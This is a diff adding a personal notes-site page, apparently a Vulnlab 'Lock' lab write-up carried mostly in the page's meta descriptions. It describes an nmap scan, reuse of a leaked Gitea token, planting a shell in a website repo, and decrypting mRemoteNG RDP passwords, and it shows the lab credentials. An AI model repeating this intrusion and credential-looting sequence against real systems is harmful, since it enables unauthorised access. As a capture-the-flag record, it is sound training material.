@@ -1,0 +1,1680 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/6-lab/vulnlab/lock/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/6-lab/vulnlab/lock/">
+
+
+<title>Lock  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/6-lab/vulnlab/lock/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="Lock">
+  <meta property="og:description" content="Scan:
+Nmap scan report for 10.10.91.85 Host is up (0.019s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Lock - Index | http-methods: |_ Potentially risky methods: TRACE 445/tcp open microsoft-ds? 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=000de57810f83b07; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=m9-ZDGG7FEDFvFsXs0KGSsjcYNk6MTcyMTgyNjA1ODkxNzQ3MjEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 24 Jul 2024 13:00:59 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=eccfe9ba6abb01a8; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=DF561VFH57BEAMRh7bfLXES0tyk6MTcyMTgyNjA2NDM4MTk1NTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 24 Jul 2024 13:01:04 GMT |_ Content-Length: 0 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: LOCK | NetBIOS_Domain_Name: LOCK | NetBIOS_Computer_Name: LOCK | DNS_Domain_Name: Lock | DNS_Computer_Name: Lock | Product_Version: 10.0.20348 |_ System_Time: 2024-07-24T13:02:20&#43;00:00 | ssl-cert: Subject: commonName=Lock | Not valid before: 2024-07-23T12:57:30 |_Not valid after: 2025-01-22T12:57:30 |_ssl-date: 2024-07-24T13:03:00&#43;00:00; -1s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-HTTPAPI/2.0We recovered the token from previous commit and then download some repos: git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.91.85:3000/ellen.freeman/website.gitGit configuration : git config --global user.email &#34;you@example.com&#34; git config --global user.name &#34;Your Name&#34;We put our shell in the website and push : git add . git commit -m &#34;Your commit message&#34; git pushWe found a config.xml: c:\Users\ellen.freeman\Documents&gt;type config.xml type config.xml &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; &lt;mrng:Connections xmlns:mrng=&#34;http://mremoteng.org&#34; Name=&#34;Connections&#34; Export=&#34;false&#34; EncryptionEngine=&#34;AES&#34; BlockCipherMode=&#34;GCM&#34; KdfIterations=&#34;1000&#34; FullFileEncryption=&#34;false&#34; Protected=&#34;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy&#43;1FnqfcPQZ3olLRy&#43;DhDFp&#34; ConfVersion=&#34;2.6&#34;&gt; &lt;Node Name=&#34;RDP/Gale&#34; Type=&#34;Connection&#34; Descr=&#34;&#34; Icon=&#34;mRemoteNG&#34; Panel=&#34;General&#34; Id=&#34;a179606a-a854-48a6-9baa-491d8eb3bddc&#34; Username=&#34;Gale.Dekarios&#34; Domain=&#34;&#34; Password=&#34;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX&#43;hUYwBePQ/2qKx&#43;57IeOROXhJxA7CczQzr1nRm89JulQDWPw==&#34; Hostname=&#34;Lock&#34; Protocol=&#34;RDP&#34; PuttySession=&#34;Default Settings&#34; Port=&#34;3389&#34; ConnectToConsole=&#34;false&#34; UseCredSsp=&#34;true&#34; RenderingEngine=&#34;IE&#34; ICAEncryptionStrength=&#34;EncrBasic&#34; RDPAuthenticationLevel=&#34;NoAuth&#34; RDPMinutesToIdleTimeout=&#34;0&#34; RDPAlertIdleTimeout=&#34;false&#34; LoadBalanceInfo=&#34;&#34; Colors=&#34;Colors16Bit&#34; Resolution=&#34;FitToWindow&#34; AutomaticResize=&#34;true&#34; DisplayWallpaper=&#34;false&#34; DisplayThemes=&#34;false&#34; EnableFontSmoothing=&#34;false&#34; EnableDesktopComposition=&#34;false&#34; CacheBitmaps=&#34;false&#34; RedirectDiskDrives=&#34;false&#34; RedirectPorts=&#34;false&#34; RedirectPrinters=&#34;false&#34; RedirectSmartCards=&#34;false&#34; RedirectSound=&#34;DoNotPlay&#34; SoundQuality=&#34;Dynamic&#34; RedirectKeys=&#34;false&#34; Connected=&#34;false&#34; PreExtApp=&#34;&#34; PostExtApp=&#34;&#34; MacAddress=&#34;&#34; UserField=&#34;&#34; ExtApp=&#34;&#34; VNCCompression=&#34;CompNone&#34; VNCEncoding=&#34;EncHextile&#34; VNCAuthMode=&#34;AuthVNC&#34; VNCProxyType=&#34;ProxyNone&#34; VNCProxyIP=&#34;&#34; VNCProxyPort=&#34;0&#34; VNCProxyUsername=&#34;&#34; VNCProxyPassword=&#34;&#34; VNCColors=&#34;ColNormal&#34; VNCSmartSizeMode=&#34;SmartSAspect&#34; VNCViewOnly=&#34;false&#34; RDGatewayUsageMethod=&#34;Never&#34; RDGatewayHostname=&#34;&#34; RDGatewayUseConnectionCredentials=&#34;Yes&#34; RDGatewayUsername=&#34;&#34; RDGatewayPassword=&#34;&#34; RDGatewayDomain=&#34;&#34; InheritCacheBitmaps=&#34;false&#34; InheritColors=&#34;false&#34; InheritDescription=&#34;false&#34; InheritDisplayThemes=&#34;false&#34; InheritDisplayWallpaper=&#34;false&#34; InheritEnableFontSmoothing=&#34;false&#34; InheritEnableDesktopComposition=&#34;false&#34; InheritDomain=&#34;false&#34; InheritIcon=&#34;false&#34; InheritPanel=&#34;false&#34; InheritPassword=&#34;false&#34; InheritPort=&#34;false&#34; InheritProtocol=&#34;false&#34; InheritPuttySession=&#34;false&#34; InheritRedirectDiskDrives=&#34;false&#34; InheritRedirectKeys=&#34;false&#34; InheritRedirectPorts=&#34;false&#34; InheritRedirectPrinters=&#34;false&#34; InheritRedirectSmartCards=&#34;false&#34; InheritRedirectSound=&#34;false&#34; InheritSoundQuality=&#34;false&#34; InheritResolution=&#34;false&#34; InheritAutomaticResize=&#34;false&#34; InheritUseConsoleSession=&#34;false&#34; InheritUseCredSsp=&#34;false&#34; InheritRenderingEngine=&#34;false&#34; InheritUsername=&#34;false&#34; InheritICAEncryptionStrength=&#34;false&#34; InheritRDPAuthenticationLevel=&#34;false&#34; InheritRDPMinutesToIdleTimeout=&#34;false&#34; InheritRDPAlertIdleTimeout=&#34;false&#34; InheritLoadBalanceInfo=&#34;false&#34; InheritPreExtApp=&#34;false&#34; InheritPostExtApp=&#34;false&#34; InheritMacAddress=&#34;false&#34; InheritUserField=&#34;false&#34; InheritExtApp=&#34;false&#34; InheritVNCCompression=&#34;false&#34; InheritVNCEncoding=&#34;false&#34; InheritVNCAuthMode=&#34;false&#34; InheritVNCProxyType=&#34;false&#34; InheritVNCProxyIP=&#34;false&#34; InheritVNCProxyPort=&#34;false&#34; InheritVNCProxyUsername=&#34;false&#34; InheritVNCProxyPassword=&#34;false&#34; InheritVNCColors=&#34;false&#34; InheritVNCSmartSizeMode=&#34;false&#34; InheritVNCViewOnly=&#34;false&#34; InheritRDGatewayUsageMethod=&#34;false&#34; InheritRDGatewayHostname=&#34;false&#34; InheritRDGatewayUseConnectionCredentials=&#34;false&#34; InheritRDGatewayUsername=&#34;false&#34; InheritRDGatewayPassword=&#34;false&#34; InheritRDGatewayDomain=&#34;false&#34; /&gt; &lt;/mrng:Connections&gt;More Creds : type .git-credentials http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000Decrypt : [Jul 26, 2024 - 17:22:39 (CEST)] exegol-Algo /workspace # python3 exploit.py config.xml Name: RDP/Gale Hostname: Lock Username: Gale.Dekarios Password: ty8wnW9qCKDosXo6Tool : https://github.com/gquere/mRemoteNG_password_decrypt/blob/master/mremoteng_decrypt.py">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Lock">
+  <meta name="twitter:description" content="Scan:
+Nmap scan report for 10.10.91.85 Host is up (0.019s latency). Not shown: 995 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Lock - Index | http-methods: |_ Potentially risky methods: TRACE 445/tcp open microsoft-ds? 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=000de57810f83b07; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=m9-ZDGG7FEDFvFsXs0KGSsjcYNk6MTcyMTgyNjA1ODkxNzQ3MjEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 24 Jul 2024 13:00:59 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=eccfe9ba6abb01a8; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=DF561VFH57BEAMRh7bfLXES0tyk6MTcyMTgyNjA2NDM4MTk1NTYwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Wed, 24 Jul 2024 13:01:04 GMT |_ Content-Length: 0 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: LOCK | NetBIOS_Domain_Name: LOCK | NetBIOS_Computer_Name: LOCK | DNS_Domain_Name: Lock | DNS_Computer_Name: Lock | Product_Version: 10.0.20348 |_ System_Time: 2024-07-24T13:02:20&#43;00:00 | ssl-cert: Subject: commonName=Lock | Not valid before: 2024-07-23T12:57:30 |_Not valid after: 2025-01-22T12:57:30 |_ssl-date: 2024-07-24T13:03:00&#43;00:00; -1s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Service Unavailable |_http-server-header: Microsoft-HTTPAPI/2.0We recovered the token from previous commit and then download some repos: git clone http://ellen.freeman:43ce39bb0bd6bc489284f2905f033ca467a6362f@10.10.91.85:3000/ellen.freeman/website.gitGit configuration : git config --global user.email &#34;you@example.com&#34; git config --global user.name &#34;Your Name&#34;We put our shell in the website and push : git add . git commit -m &#34;Your commit message&#34; git pushWe found a config.xml: c:\Users\ellen.freeman\Documents&gt;type config.xml type config.xml &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; &lt;mrng:Connections xmlns:mrng=&#34;http://mremoteng.org&#34; Name=&#34;Connections&#34; Export=&#34;false&#34; EncryptionEngine=&#34;AES&#34; BlockCipherMode=&#34;GCM&#34; KdfIterations=&#34;1000&#34; FullFileEncryption=&#34;false&#34; Protected=&#34;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy&#43;1FnqfcPQZ3olLRy&#43;DhDFp&#34; ConfVersion=&#34;2.6&#34;&gt; &lt;Node Name=&#34;RDP/Gale&#34; Type=&#34;Connection&#34; Descr=&#34;&#34; Icon=&#34;mRemoteNG&#34; Panel=&#34;General&#34; Id=&#34;a179606a-a854-48a6-9baa-491d8eb3bddc&#34; Username=&#34;Gale.Dekarios&#34; Domain=&#34;&#34; Password=&#34;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX&#43;hUYwBePQ/2qKx&#43;57IeOROXhJxA7CczQzr1nRm89JulQDWPw==&#34; Hostname=&#34;Lock&#34; Protocol=&#34;RDP&#34; PuttySession=&#34;Default Settings&#34; Port=&#34;3389&#34; ConnectToConsole=&#34;false&#34; UseCredSsp=&#34;true&#34; RenderingEngine=&#34;IE&#34; ICAEncryptionStrength=&#34;EncrBasic&#34; RDPAuthenticationLevel=&#34;NoAuth&#34; RDPMinutesToIdleTimeout=&#34;0&#34; RDPAlertIdleTimeout=&#34;false&#34; LoadBalanceInfo=&#34;&#34; Colors=&#34;Colors16Bit&#34; Resolution=&#34;FitToWindow&#34; AutomaticResize=&#34;true&#34; DisplayWallpaper=&#34;false&#34; DisplayThemes=&#34;false&#34; EnableFontSmoothing=&#34;false&#34; EnableDesktopComposition=&#34;false&#34; CacheBitmaps=&#34;false&#34; RedirectDiskDrives=&#34;false&#34; RedirectPorts=&#34;false&#34; RedirectPrinters=&#34;false&#34; RedirectSmartCards=&#34;false&#34; RedirectSound=&#34;DoNotPlay&#34; SoundQuality=&#34;Dynamic&#34; RedirectKeys=&#34;false&#34; Connected=&#34;false&#34; PreExtApp=&#34;&#34; PostExtApp=&#34;&#34; MacAddress=&#34;&#34; UserField=&#34;&#34; ExtApp=&#34;&#34; VNCCompression=&#34;CompNone&#34; VNCEncoding=&#34;EncHextile&#34; VNCAuthMode=&#34;AuthVNC&#34; VNCProxyType=&#34;ProxyNone&#34; VNCProxyIP=&#34;&#34; VNCProxyPort=&#34;0&#34; VNCProxyUsername=&#34;&#34; VNCProxyPassword=&#34;&#34; VNCColors=&#34;ColNormal&#34; VNCSmartSizeMode=&#34;SmartSAspect&#34; VNCViewOnly=&#34;false&#34; RDGatewayUsageMethod=&#34;Never&#34; RDGatewayHostname=&#34;&#34; RDGatewayUseConnectionCredentials=&#34;Yes&#34; RDGatewayUsername=&#34;&#34; RDGatewayPassword=&#34;&#34; RDGatewayDomain=&#34;&#34; InheritCacheBitmaps=&#34;false&#34; InheritColors=&#34;false&#34; InheritDescription=&#34;false&#34; InheritDisplayThemes=&#34;false&#34; InheritDisplayWallpaper=&#34;false&#34; InheritEnableFontSmoothing=&#34;false&#34; InheritEnableDesktopComposition=&#34;false&#34; InheritDomain=&#34;false&#34; InheritIcon=&#34;false&#34; InheritPanel=&#34;false&#34; InheritPassword=&#34;false&#34; InheritPort=&#34;false&#34; InheritProtocol=&#34;false&#34; InheritPuttySession=&#34;false&#34; InheritRedirectDiskDrives=&#34;false&#34; InheritRedirectKeys=&#34;false&#34; InheritRedirectPorts=&#34;false&#34; InheritRedirectPrinters=&#34;false&#34; InheritRedirectSmartCards=&#34;false&#34; InheritRedirectSound=&#34;false&#34; InheritSoundQuality=&#34;false&#34; InheritResolution=&#34;false&#34; InheritAutomaticResize=&#34;false&#34; InheritUseConsoleSession=&#34;false&#34; InheritUseCredSsp=&#34;false&#34; InheritRenderingEngine=&#34;false&#34; InheritUsername=&#34;false&#34; InheritICAEncryptionStrength=&#34;false&#34; InheritRDPAuthenticationLevel=&#34;false&#34; InheritRDPMinutesToIdleTimeout=&#34;false&#34; InheritRDPAlertIdleTimeout=&#34;false&#34; InheritLoadBalanceInfo=&#34;false&#34; InheritPreExtApp=&#34;false&#34; InheritPostExtApp=&#34;false&#34; InheritMacAddress=&#34;false&#34; InheritUserField=&#34;false&#34; InheritExtApp=&#34;false&#34; InheritVNCCompression=&#34;false&#34; InheritVNCEncoding=&#34;false&#34; InheritVNCAuthMode=&#34;false&#34; InheritVNCProxyType=&#34;false&#34; InheritVNCProxyIP=&#34;false&#34; InheritVNCProxyPort=&#34;false&#34; InheritVNCProxyUsername=&#34;false&#34; InheritVNCProxyPassword=&#34;false&#34; InheritVNCColors=&#34;false&#34; InheritVNCSmartSizeMode=&#34;false&#34; InheritVNCViewOnly=&#34;false&#34; InheritRDGatewayUsageMethod=&#34;false&#34; InheritRDGatewayHostname=&#34;false&#34; InheritRDGatewayUseConnectionCredentials=&#34;false&#34; InheritRDGatewayUsername=&#34;false&#34; InheritRDGatewayPassword=&#34;false&#34; InheritRDGatewayDomain=&#34;false&#34; /&gt; &lt;/mrng:Connections&gt;More Creds : type .git-credentials http://ellen.freeman:YWFrWJk9uButLeqx@localhost:3000Decrypt : [Jul 26, 2024 - 17:22:39 (CEST)] exegol-Algo /workspace # python3 exploit.py config.xml Name: RDP/Gale Hostname: Lock Username: Gale.Dekarios Password: ty8wnW9qCKDosXo6Tool : https://github.com/gquere/mRemoteNG_password_decrypt/blob/master/mremoteng_decrypt.py">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/6-lab/",
+       "name": "Labs",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/6-lab/vulnlab/",
+       "name": "Vulnlab",
+       "position": 4
+     },
+     {
+       "@type": "ListItem",
+       "name": "Lock",
+       "position": 5
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/5-crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/5-crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details open open>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details open>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/6-lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/6-lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
